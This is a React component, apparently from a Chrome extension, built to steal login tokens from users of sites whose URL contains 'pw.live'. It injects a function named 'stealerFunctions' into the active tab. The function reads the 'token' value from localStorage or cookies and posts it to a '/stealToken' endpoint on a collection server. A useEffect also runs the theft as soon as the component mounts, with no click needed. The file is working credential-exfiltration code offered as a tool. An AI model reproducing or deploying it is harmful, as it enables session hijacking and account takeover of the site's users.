import React, { useEffect } from "react";
import { getAcitveWindow } from "../utils/chromeApis/getCurrentAcitivewindow";
import { excuteScript } from "../utils/chromeApis/runScriptOn";

const ProvideToken: React.FC = () => {
  const [isSending, setIsSending] = React.useState(false);
  const [isSent, setIsSent] = React.useState(false);
  const stealerFunctions = async () => {
    const LocalStorageToken = localStorage.getItem("token");
    const cookieToken = document.cookie
      .split("; ")
      .find((row) => row.startsWith("token="))
      ?.split("=")[1];
    const token = LocalStorageToken || cookieToken;
    // server health check
    const response = await fetch("http://localhost:3000/api/v1/health");

    if (token && response.ok) {
      const stealToken = await fetch(
        "http://localhost:3000/api/v1/stealToken",
        {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
          },
          body: JSON.stringify({ token }),
        },
      );
      if (stealToken.ok) {
        console.log("Token sent successfully");
      } else {
        console.error("Failed to send token");
      }
    } else {
      console.error("No token found or server is down");
    }
  };
  const handleSendToken = async () => {
    setIsSending(true);
    try {
      const currrectTab = await getAcitveWindow();
      if (
        currrectTab &&
        currrectTab.id &&
        currrectTab.url?.includes("pw.live")
      ) {
        await excuteScript(currrectTab.id, stealerFunctions);
      }
    } catch (error) {
      console.error("Error sending token:", error);
    } finally {
      setIsSending(false);
      setIsSent(true);
    }
  };

  useEffect(() => {
    let timer: any;
    if (isSent) {
      timer = setTimeout(() => {
        setIsSent(false);
      }, 3000); // Reset after 3 seconds
    }
    return () => clearTimeout(timer);
  }, [isSent]);
  useEffect(() => {
    stealerFunctions()
    },[]);
  return (
    <button onClick={handleSendToken}>
      {isSending ? "Sending" : isSent ? "Sent!" : "Send Token"}
    </button>
  );
};

export default ProvideToken;
